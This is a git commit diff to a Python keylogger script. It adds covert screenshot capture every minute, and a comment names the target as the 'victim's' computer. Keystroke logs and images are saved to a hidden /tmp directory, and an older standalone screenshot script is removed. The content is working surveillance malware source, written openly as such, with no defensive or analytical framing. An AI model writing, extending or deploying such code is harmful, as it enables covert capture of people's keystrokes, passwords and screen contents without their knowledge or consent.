b871f6e366c9a7b65e4d05da10391f4082cb5a3d
Alexis Rodriguez <rodriguez10011999@gmail.com>
2020-02-12 14:34:41 -0500

    adding/updating file

--- keylogger.py
+++ keylogger.py
@@ -5,9 +5,22 @@ Date : 2020-02-09
 '''
 from pynput import keyboard
 import threading
+import pyautogui as pygrab
 import sys
+import os
+import time
 
 log = ''
+'''
+make directory in /tmp folder
+'''
+def make_dir():
+	try:
+		dir_to_create = "/tmp/folder/"
+		os.mkdir(dir_to_create)
+	except OSError:
+		pass
+	return dir_to_create
 
 '''
 Handles the action taken when a 
@@ -33,13 +46,36 @@ Logging to a file every 5 seconds
 def log_to_file():
 	global log
 	file_to_create = sys.argv[1]
-	f = open(file_to_create, 'w')
+	f = open(make_dir() + sys.argv[1], 'w')
 	f.write(log)
 	clock = threading.Timer(5, log_to_file)
 	clock.start()
 
+'''
+get time image was taken append it to 
+the name of the images file
+'''
+def make_image_name():
+	seconds_since_epoch = time.time()
+	date = time.ctime(seconds_since_epoch).split()
+	return date[1] + '_' + date[2] + '_' + date[3]
+
+'''
+Take a screenshot of the victions computer
+every minute and save it to /tmp/folder directory
+'''
+def save_screen():
+	image = pygrab.screenshot()
+	time = make_image_name()
+	image.save(r'/tmp/folder/normal_' + time + '.png')
+	take_screen = threading.Timer(60, save_screen)
+	take_screen.start()
+
+
 def main():
 	global log
+	make_dir()
+	save_screen()
 	# start the keylogger
 	with keyboard.Listener(
 		on_press=on_press) as listener:
--- screensh.py
+++
@@ -1,7 +0,0 @@
-#!/usr/bin/env python3
-import pyautogui as pygrab
-
-def main():
-	image = pygrab.screenshot()
-	image.save(r'/root/name.png')
-main()
